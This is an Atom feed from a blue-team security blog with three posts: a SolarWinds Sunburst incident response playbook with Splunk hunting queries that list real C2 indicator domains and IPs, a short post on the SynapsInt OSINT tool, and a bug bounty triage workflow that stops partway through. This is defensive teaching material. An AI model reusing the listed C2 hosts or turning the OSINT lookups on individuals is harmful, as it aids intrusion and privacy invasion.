<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2021-08-18T12:24:48+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Blog | Cyber Security</title><subtitle>He's sharing his experiences and knowledge about reallife cyber security incidents and shares with community.</subtitle><author><name>Santhosh Baswa</name></author><entry><title type="html">Solarigate/Sunburst Incident Response Playbook &amp;amp; Investigation/Hunting/MindMap for CSIRT/SOC/InfoSec/SecOps Teams</title><link href="http://localhost:4000/blueteam_solarigate_sunburst_ir_playbook_investigation/" rel="alternate" type="text/html" title="Solarigate/Sunburst Incident Response Playbook &amp;amp; Investigation/Hunting/MindMap for CSIRT/SOC/InfoSec/SecOps Teams" /><published>2020-12-22T04:00:00+07:00</published><updated>2020-12-22T04:00:00+07:00</updated><id>http://localhost:4000/blueteam_solarigate_sunburst_ir_playbook_investigation</id><content type="html" xml:base="http://localhost:4000/blueteam_solarigate_sunburst_ir_playbook_investigation/">&lt;p&gt;Last few days, Solarigate aka Sunburst zero-day backdoor is being very popular in Infosec world. There was lot of enterprise/govt/nationalagencies/organisations were affected by this backdoor and most of the CSIRT/SOC/SecOps teams were very busy with handling related to solarwinds backdoor incidents.&lt;/p&gt;

&lt;p&gt;In this article, I would like to share some IR tips/experiences/plan and threat model on this incident and most of organisations and teams were looking for proper IR plan and investigation steps with proper remediation.&lt;/p&gt;

&lt;p&gt;Most of the smart/advanced SecOps teams not wait for SIEM/Threat Intel hits/alerts to handle the these type of incidents. They will start hunting in their environment and create a plan &amp;amp; execute threat hunting hypothesis on these type of emerging threats.&lt;/p&gt;

&lt;h3 id=&quot;threat-hunting-assumptions-solarigatesunburst&quot;&gt;Threat Hunting Assumptions: Solarigate/Sunburst&lt;/h3&gt;

&lt;p&gt;Let’s assume below of threat hunting hypothesis in your environment.&lt;/p&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  1. Identify the specific vulnerable backdoor package identification &amp;amp; timeline. (Ex:Aug 2019 onwards)
  2. Check whether specific vulnerable servers/application logs covered/stored in your SIEM/Logging solutions.
  3. Threat actor is compromised external faced solarwinds Orion servers and gather privileged level access like administrative / user accounts.
  4. Threat actor is able communicate via C2 channel to Vulnerable servers and exfiltration activity was happend.
  5. There was no malicious activity was identified on specific vulnerable servers (not matching with any IOCs/detections but that specific server is vulnerable).
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;incident-response-plan-and-playbookworkflow-&quot;&gt;Incident Response Plan and Playbook/Workflow :&lt;/h3&gt;

&lt;h4 id=&quot;notifydetect&quot;&gt;Notify/Detect:&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;If any existing IOCs/hash/detections was triggered in your environment, identify the affected servers and user accounts.&lt;/li&gt;
  &lt;li&gt;Update your security products with latest Threat Intel feed on specific threat adversary.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;confirmation&quot;&gt;Confirmation:&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;In this adversary is mainly focusing on supply chain attacks, we don’t conclude based on our detections.
Because we don’t know how those IOC/IOAs were entered into your environment.&lt;/li&gt;
  &lt;li&gt;So, before that communicate with Vulnerability Management/Asset Management teams and get confirmation about the specific affected devices/servers/VMs.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;investigation&quot;&gt;Investigation:&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;In any IR incident investigation, we have to look at different possible places. So, we should look at multiple log sources and different patterns.&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;different-scenarios&quot;&gt;Different Scenarios:&lt;/h5&gt;

&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    1. Solarwinds Orion server compromise
    2. Gather privileged local/Domain connected administrator accounts (from Compromised Solarwinds Orion Servers)
    3. Access other resources using compromised AD connected accounts get access to Cloud/On-prime resources
    4. Compromise email accounts and change configs/Inbox rules.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h5 id=&quot;steps&quot;&gt;Steps:&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;Take snapshot/image the compromised/vulnerable Solarwinds Orion server.&lt;/li&gt;
  &lt;li&gt;Apply yara rules/hashing using multiple forensic/RE tools.&lt;/li&gt;
  &lt;li&gt;Finalise the timeline and shortlist the log sources where we were going to investigate in SIEM/3rd party Products.&lt;/li&gt;
&lt;/ul&gt;

&lt;h6 id=&quot;adminuser-account-level-compromised-usersassociated-with-solarwinds-orion-serversvms&quot;&gt;Admin/User Account Level: (Compromised Users/Associated with Solarwinds Orion Servers/VMs)&lt;/h6&gt;
&lt;ul&gt;
  &lt;li&gt;List out all of the user accounts used in Solarwinds Orion servers &amp;amp; monitor agent installed VMs/Systems.&lt;/li&gt;
  &lt;li&gt;Get the all relevant users login activity details ( Success/Failure events)
    &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    i. Success events by Accountwise ( Sorting Order - Low to High)
    ii. Failed events by Accountwise ( Sorting Order - Low to High)
    iii. Newly created accounts by Serverwise ( Specified timeline)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Once you identify the compromised accounts, look at those user account activities on perimeter level. (Cloud/AD/VPN logs etc.)&lt;/li&gt;
  &lt;li&gt;Look at the compromised accounts email box configurations (Login activity/Email communications/Permissions/Inbox Rules etc.)&lt;/li&gt;
&lt;/ul&gt;

&lt;h6 id=&quot;network-level-brofirewallzeekother-products&quot;&gt;Network Level: (Bro/Firewall/Zeek/Other Products)&lt;/h6&gt;
&lt;ul&gt;
  &lt;li&gt;Check whether any C2/IP/domain (Solarigate/Sunburst IOCs) communication/hits in the environment.&lt;/li&gt;
  &lt;li&gt;Check whether vulnerable/compromised servers/VMs is communicate with internal systems. ( Specific Timeline)&lt;/li&gt;
  &lt;li&gt;Check compromised accounts activities over network. (User Login hits/User session/C2 beaconing etc.)&lt;/li&gt;
&lt;/ul&gt;

&lt;h6 id=&quot;endpoint-level-edrsysmonwinevents-etc&quot;&gt;Endpoint Level: (EDR/Sysmon/Winevents etc)&lt;/h6&gt;
&lt;ul&gt;
  &lt;li&gt;Check specific backdoor DLL files available in Solarwinds Orion servers/VMs.&lt;/li&gt;
  &lt;li&gt;Hunt using IOA/Filenames/Hashes/Filesize/SignedCertificateInfo across multiple endpoint/servers using EDR solutions.&lt;/li&gt;
  &lt;li&gt;Digging out if any suspicious processes/activity in Solarwinds Orion server/VMs. (Registry Changes/Suspicious Process/Backdoor DLL/Startup etc.)&lt;/li&gt;
  &lt;li&gt;Change all user account passwords and look at the permissions/configurations in Solarwinds Orion server/VMs.&lt;/li&gt;
  &lt;li&gt;Look at the EDR/Sysmon suspicious old incidents in Specific timeline. (Linking Incidents/Mapping with MITRE)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;containment&quot;&gt;Containment:&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Isolate the vulnerable/infected SolarWinds Orion servers.
    &lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  (i). Look at Digital Forensic team investigation report and add those suspected hashes/files in  block/monitor mode.
  (ii). If you have existing EDR solution please isolate at firewall level (Only server can access EDR console)
  (iii). After forensic imaging and investigation shutdown the servers.  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Look at other service accounts which will access other applications, investigate those application logs take necessary actions. (SQL/SNMP/WMI etc.)&lt;/li&gt;
  &lt;li&gt;Implement IDPS/proxy level defenses in your environment.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;eradication&quot;&gt;Eradication:&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Most of the steps were covered in Containment phase.&lt;/li&gt;
  &lt;li&gt;Prepare a good plan for securing the user account/ server / network level config management and capture all logs in internal/external perimeter devices/servers.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;recovery&quot;&gt;Recovery:&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Backup the server configs/data.&lt;/li&gt;
  &lt;li&gt;Design a process for secure configure golden image and Rebuild the all affected servers/VMs.&lt;/li&gt;
  &lt;li&gt;Install updated version of Solarwinds Orion.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;siem-hunting-queries&quot;&gt;SIEM Hunting Queries&lt;/h3&gt;

&lt;h4 id=&quot;splunk&quot;&gt;Splunk&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Search for Event code 4624 (any logins to the Solarwinds server) find out credentials that could be compromised.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;search &lt;span class=&quot;nv&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;windows_events_index&amp;gt; solarwinds&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;EventCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4624&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Workstation_Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;solarwinds&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
| stats count min&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_time&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AS first_time max&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_time&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AS last_time by Workstation_Name Security_ID Logon_Type
| convert &lt;span class=&quot;nv&quot;&gt;timeformat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;%d/%m/%Y %H:%M:%S&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; ctime&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;_time&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| &lt;span class=&quot;nb&quot;&gt;sort &lt;/span&gt;count
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Check Bro for any Solarwinds DNS lookups - find any unknown or test instances of Solarwinds.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;search &lt;span class=&quot;nv&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;bro_logs index&amp;gt;_index &lt;span class=&quot;nv&quot;&gt;sourcetype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bro_dns &lt;span class=&quot;nv&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;solarwinds.com&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
| rex &lt;span class=&quot;nv&quot;&gt;field&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;_raw &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;^&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;+&lt;span class=&quot;se&quot;&gt;\.\d&lt;/span&gt;+&lt;span class=&quot;se&quot;&gt;\s\S&lt;/span&gt;+&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;?&amp;lt;src_ip&amp;gt;&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;+&lt;span class=&quot;se&quot;&gt;\.\d&lt;/span&gt;+&lt;span class=&quot;se&quot;&gt;\.\d&lt;/span&gt;+&lt;span class=&quot;se&quot;&gt;\.\d&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
| search src_ip IN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;solarwinds_ip&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;solarwinds_ip&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;solarwinds_ip&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;solarwinds_ip&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Check for any historical HTTP/S traffic outbound to published IOCs with any applicable http/s logs
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;search &lt;span class=&quot;nv&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;bro_logs index&amp;gt;_index deftsecurity.com OR freescanonline.com OR thedoccloud.com OR thedoccloud.com OR websitetheme.com OR highdatabase.com OR incomeupdate.com OR databasegalore.com OR panhardware.com OR zupertech.com OR appsync-api.eu-west-1.avsvmcloud.com OR appsync-api.eu-west-1.avsvmcloud.com OR appsync-api.us-east-2.avsvmcloud.com OR appsync-api.us-west-2.avsvmcloud.com OR appsync-api.us-west-2.avsvmcloud.com OR appsync-api.eu-west-1.avsvmcloud.com | stats count earliest&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_time&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AS Earliest, latest&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_time&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AS Latest by sourcetype &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;host | &lt;span class=&quot;nb&quot;&gt;eval &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Earliest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;strftime&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Earliest,&lt;span class=&quot;s2&quot;&gt;&quot;%+&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;eval &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Latest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;strftime&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Latest,&lt;span class=&quot;s2&quot;&gt;&quot;%+&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; - count
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Check for any historical IP traffic outbound to the published IOCs with any applicable logs
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;search &lt;span class=&quot;nv&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;bro_logs_index&amp;gt; 54.193.127.66 OR 54.215.192.52 OR 34.203.203.23 OR 139.99.115.204 OR 5.252.177.25 OR 204.188.205.176 OR 51.89.125.18 OR 167.114.213.199 OR 13.59.205.66 OR 5.252.177.21 | stats count earliest&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_time&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AS Earliest, latest&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_time&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AS Latest by index sourcetype &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;host | &lt;span class=&quot;nb&quot;&gt;eval &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Earliest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;strftime&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Earliest,&lt;span class=&quot;s2&quot;&gt;&quot;%+&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;eval &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Latest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;strftime&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Latest,&lt;span class=&quot;s2&quot;&gt;&quot;%+&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; - count
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;other-references-azure-sentinelazure-adyaraattckzeek-etc&quot;&gt;Other References (Azure Sentinel/Azure AD/Yara/ATT&amp;amp;CK/Zeek etc.)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://techcommunity.microsoft.com/t5/azure-sentinel/solarwinds-post-compromise-hunting-with-azure-sentinel/ba-p/1995095&quot;&gt;Azure Sentinel - Hunting &lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://techcommunity.microsoft.com/t5/azure-active-directory-identity/azure-ad-workbook-to-help-you-assess-solorigate-risk/ba-p/2010718&quot;&gt;Azure AD Monitor - Hunting&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/fireeye/red_team_tool_countermeasures&quot;&gt;Yara Rules - Hunting&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://corelight.blog/2020/12/22/detecting-sunburst-solarigate-activity-in-retrospect-with-zeek-a-practical-example/&quot;&gt;Zeek - Hunting&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/mitre-attack/identifying-unc2452-related-techniques-9f7b6c7f3714&quot;&gt;MITRE ATT&amp;amp;CK - Mapping&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;mindmap---solarigatesunburst-supply-chain-attack&quot;&gt;MindMap - Solarigate/Sunburst Supply chain Attack&lt;/h3&gt;
&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/solarwinds_solaris_blueteam_ir/SOLORIGATE_SUNBURST.png&quot; alt=&quot;&quot; /&gt;
&lt;figcaption&gt; Solarigate/Sunburst - Mindmap &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h3 id=&quot;reference-articles&quot;&gt;Reference Articles:&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/sophos-cybersecurity/solarwinds-threathunt&quot;&gt;Sophos - Threat Hunting&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.trustedsec.com/blog/solarwinds-backdoor-sunburst-incident-response-playbook/&quot;&gt;TrustedSec - Article&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html&quot;&gt;Fireeye&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Santhosh Baswa</name></author><category term="blueteam" /><category term="solarwinds" /><category term="triage" /><category term="ir" /><category term="investigation" /><category term="forensics" /><summary type="html">Last few days, Solarigate aka Sunburst zero-day backdoor is being very popular in Infosec world. There was lot of enterprise/govt/nationalagencies/organisations were affected by this backdoor and most of the CSIRT/SOC/SecOps teams were very busy with handling related to solarwinds backdoor incidents.</summary></entry><entry><title type="html">OSINT - SynapsInt Unified Research Tool</title><link href="http://localhost:4000/osint-enumeration-synapsint-unified-research/" rel="alternate" type="text/html" title="OSINT - SynapsInt Unified Research Tool" /><published>2020-10-05T19:00:00+07:00</published><updated>2020-10-05T19:00:00+07:00</updated><id>http://localhost:4000/osint-enumeration-synapsint-unified-research</id><content type="html" xml:base="http://localhost:4000/osint-enumeration-synapsint-unified-research/">&lt;p&gt;This OSINT platform is very useful for SOC/CSIRT/InfoSec/OSINT research teams to find the juicy information about the domain or IP address. It provides lot of information like metatags, old website records, ISP, virus analysis, open ports, vulnerabilities, subdomains, location, network, WHOIS, DNS records, Web Technologies used, Pastes, Social Media accounts, Blacklisted IP and other stuff. Even it provies the leaked information or details about an email account and phone numbers data as well.&lt;/p&gt;

&lt;h4 id=&quot;website&quot;&gt;Website:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://synapsint.com/&quot;&gt;SynapsInt - An unified OSINT research tool - https://synapsint.com/&lt;/a&gt;&lt;/p&gt;

&lt;h5 id=&quot;osint--intel-search-based&quot;&gt;OSINT  Intel search based:&lt;/h5&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Domain
IP Address
Email
Phone
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;references&quot;&gt;References&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://twitter.com/Dinosn/status/1312640210530906112&quot;&gt;Twitter&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Santhosh Baswa</name></author><category term="osint" /><category term="python" /><category term="email" /><category term="domain" /><category term="phone" /><category term="recon" /><category term="validation" /><summary type="html">This OSINT platform is very useful for SOC/CSIRT/InfoSec/OSINT research teams to find the juicy information about the domain or IP address. It provides lot of information like metatags, old website records, ISP, virus analysis, open ports, vulnerabilities, subdomains, location, network, WHOIS, DNS records, Web Technologies used, Pastes, Social Media accounts, Blacklisted IP and other stuff. Even it provies the leaked information or details about an email account and phone numbers data as well.</summary></entry><entry><title type="html">BlueTeam - Bug Bounty Triage - Challenges &amp;amp; Triage Workflow for CSIRT teams</title><link href="http://localhost:4000/blueteam-bugbounty-triage-organization/" rel="alternate" type="text/html" title="BlueTeam - Bug Bounty Triage - Challenges &amp;amp; Triage Workflow for CSIRT teams" /><published>2020-09-20T01:00:00+07:00</published><updated>2020-09-20T01:00:00+07:00</updated><id>http://localhost:4000/blueteam-bugbounty-triage-organization</id><content type="html" xml:base="http://localhost:4000/blueteam-bugbounty-triage-organization/">&lt;p&gt;In these days bug bounty programs were popular and most of the organisations were enrolled to multiple bug bounty platforms or running their own vulnerability disclosure programs. While running these programs, most of the security researchers/hunters actively scanning/enumerating particular scope of company external infrastructure.&lt;/p&gt;

&lt;h5 id=&quot;bug-bounty-platforms&quot;&gt;Bug bounty Platforms:&lt;/h5&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://hackerone.com/security&quot;&gt;HackerOne&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.bugcrowd.com/bug-bounty-list/&quot;&gt;Bug Crowd&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://yogosha.com/&quot;&gt;Yogosha&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Most of the organizations doesn’t have idea on what challenges CSIRT/SOC/InfoSec teams will face while handling Bug Bounty Incidents/Submissions, sometimes they don’t have proper IR plan/Workflow to handle Bug Bounty Incidents/Submissions. So, Here I shared some insights about the common challenges &amp;amp; bug-bounty triage workflows which can helpful for Blue Teams (CSIRT/SOC/InfoSec)&lt;/p&gt;

&lt;h3 id=&quot;common-challenges-for-csirt--soc-teams---handling-bug-bounty-incidents&quot;&gt;Common challenges for CSIRT / SOC teams - Handling Bug Bounty Incidents:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Most of the security researchers/bug-bounty hunters will scan the company infrastructure and generate lot of traffic on external perimeter. While doing scanning activity, our security teams will get high volume of security alerts in their Defense tools.&lt;/li&gt;
  &lt;li&gt;Lot of organisations doesn’t have proper internal documentation for handling the Bug bounty incidents.(Direct/ Platforms)&lt;/li&gt;
  &lt;li&gt;Skill gap: Lack of knowledge on AppSec and not able to understand the security researcher POC submission.&lt;/li&gt;
  &lt;li&gt;Developers Team: Even security teams able to explain the application vulnerability to Dev/App teams, they were unable to understand why this flaw came and no knowledge on fixing part.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;preparation---bug-bountyvulnerability-disclosure-program&quot;&gt;Preparation - Bug Bounty/Vulnerability Disclosure Program:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Asset management is very critical for any of the organisations. If assets information is regularly maintained/updated by Sysadmins/DevOps/Dev/App teams, our security teams can easily identify the assets / application own information.&lt;/li&gt;
  &lt;li&gt;Good Sync with App/Developer/Test teams. While reporting about the incident to appropriate team, we have to provide in-detailed technical information and recommendations as well. If they have any challenges while fixing the issue, security teams should have support them.&lt;/li&gt;
  &lt;li&gt;Based on the criticality of the bug, security teams should maintain SLAs with other teams while handling these incidents. It should be integrated with ticketing system.&lt;/li&gt;
  &lt;li&gt;External perimeter critical devices/apps IP/Host/Owner information should be captured in Vulnerability Management Systems.(Qualys/Nessus etc.)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;key-players-to-triage-bug-bounty-incidents&quot;&gt;Key players to Triage Bug Bounty Incidents:&lt;/h3&gt;

&lt;h5 id=&quot;platform&quot;&gt;Platform:&lt;/h5&gt;
&lt;p&gt;These days companies are enrolling multiple bug-bounty platforms like hacker one etc.Those platforms provides the company vulnerability disclosure program information like policies, scope of the infrastructure, guidelines etc. And if any security researcher/hunter submitted bugs their platform, they will validate and informed to company’s security team.&lt;/p&gt;
&lt;h5 id=&quot;security-analyst&quot;&gt;Security Analyst:&lt;/h5&gt;
&lt;p&gt;Security Analyst actively monitoring alerts will do initial analysis and share their findings with Senior Engineers to get understand about the submitted bug/vulnerability.&lt;/p&gt;
&lt;h5 id=&quot;srsecurity-engineer-appsecvulnerability-management&quot;&gt;Sr.Security Engineer (AppSec/Vulnerability Management):&lt;/h5&gt;
&lt;p&gt;Security engineers will understand the exact vulnerability and identify affected applications. Get more information about the technical and internal owner information and schedule meeting with appropriate internal teams to close these incidents. (Dev/App/SysAdmin/Cloud)&lt;/p&gt;
&lt;h5 id=&quot;lead-engineer&quot;&gt;Lead Engineer:&lt;/h5&gt;
&lt;p&gt;If any bug is critical which can impact the production or confidential data exposure, they will co-ordinate with legal/PR/Technical teams to understand about the vulnerability or data exposure. If any vulnerability becomes a data-breach, they will informed to Management.&lt;/p&gt;
&lt;h5 id=&quot;manager&quot;&gt;Manager:&lt;/h5&gt;
&lt;p&gt;These people is continuously monitor the engineers how they were triaging and coordinate with other internal teams. If any gaps identified, manager’s should discuss with team members and get more ideas/inputs from them. Based on those inputs, they have to change their internal process documents for handling these Bug bounty incidents. If any critical escalations/data-breach linked bugs, they have to present in-front of C-suite to get their attention on those critical incidents.&lt;/p&gt;
&lt;h5 id=&quot;system-admin-team&quot;&gt;System Admin Team:&lt;/h5&gt;
&lt;p&gt;Most of the companies having different offices across the world. So, local IT/Sysadmin teams were very critical while handling these type of incidents. Security teams always maintains good repo with these teams. It would be very helpful them to track down the asset/application/server owners information in their region.&lt;/p&gt;
&lt;h5 id=&quot;developmentapplication-team&quot;&gt;Development/Application Team:&lt;/h5&gt;
&lt;p&gt;Most of the developers were focusing on their Product portfolio and features and maintenance. These days few organisations introduced DevSecOps culture to fix critical bugs/vulnerabilities in initial phases of the Development model. Developers also should have security knowledge to fix vulnerabilities in their applications.&lt;/p&gt;
&lt;h5 id=&quot;legalpublic-relations-team&quot;&gt;Legal/Public Relations Team:&lt;/h5&gt;
